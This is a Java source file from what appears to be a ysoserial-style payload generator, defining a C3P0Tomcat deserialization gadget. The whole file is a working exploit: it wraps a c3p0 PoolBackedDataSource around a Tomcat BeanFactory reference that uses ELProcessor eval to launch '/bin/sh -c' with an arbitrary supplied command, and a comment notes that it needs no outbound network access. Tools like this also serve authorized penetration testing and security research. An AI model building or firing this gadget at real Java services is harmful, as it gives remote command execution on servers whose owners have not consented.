package me.gv7.woodpecker.yso.payloads;

import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
import me.gv7.woodpecker.yso.payloads.annotation.PayloadTest;
import me.gv7.woodpecker.yso.payloads.custom.CustomCommand;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import me.gv7.woodpecker.yso.payloads.util.Reflections;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

/**
 *  无需出网即可利用
 *  目前只完成了*nix 环境下的命令执行，暂未解决执行任意js/任意Java代码
 */
@PayloadTest( harness="ysoserial.test.payloads.RemoteClassLoadingTest" )
@Dependencies( { "com.mchange:c3p0:0.9.5.2" ,"com.mchange:mchange-commons-java:0.2.11"} )
@Authors({ Authors.yulegeyu })
public class C3P0Tomcat implements ObjectPayload<Object> {

    @Override
    public Object getObject (String command) throws Exception {
        if (command.startsWith(CustomCommand.COMMAND_RAW_CMD)) {
            command = command.substring(CustomCommand.COMMAND_RAW_CMD.length());
        }
        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource("org.apache.naming.factory.BeanFactory", command));
        return b;
    }

    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
        private String className;
        private String command;

        public PoolSource (String className, String command) {
            this.className = className;
            this.command = command;
        }

        public Reference getReference() throws NamingException {
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            ref.add(new StringRefAddr("forceString", "x=eval"));
            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','"+ command +"']).start()\")"));
            return ref;
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}
    }

    public static void main ( String[] args ) throws Exception {
        PayloadRunner.run(C3P0Tomcat.class, args);
    }
}
